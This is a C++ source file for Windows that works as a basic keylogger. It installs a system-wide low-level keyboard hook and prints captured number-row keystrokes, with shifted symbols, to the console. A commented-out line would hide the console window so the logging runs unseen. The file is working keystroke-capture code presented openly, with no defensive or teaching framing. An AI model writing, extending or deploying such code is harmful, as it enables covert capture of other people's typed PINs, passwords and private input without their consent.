#include "stdafx.h"
#include <windows.h>
#include "axonUtil.h"
#include <string>
#include <sstream>
#include <iostream>
#include <cstdio>
using namespace std;

HHOOK hKeyboardHook;

#pragma region Kelogging
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	BOOL inKey = FALSE;
	DWORD SHIFT_key = 0;
	unsigned int vCode[40] = {0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39};
	char lowCase[40] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
	char upCase[40] = {')', '!', '@', '#', '$', '%', '^', '&', '*', '('};

	
	if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
	{
		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;

		SHIFT_key = GetAsyncKeyState(VK_SHIFT);

		for (int i = 0; i < 40; i++)
		{
			if (p->vkCode == vCode[i])
			{
				if (GetAsyncKeyState(VK_SHIFT) >= 0)
					cout << lowCase[i];
				else
					cout << upCase[i];
			}
		}

	}
	return(inKey ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}
#pragma endregion

int main()
{	
	HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);

	MSG msg;
	while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
		TranslateMessage(&msg);
		DispatchMessage(&msg);
		}
	//ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false); //Hides the console window
	

    return 0;
}

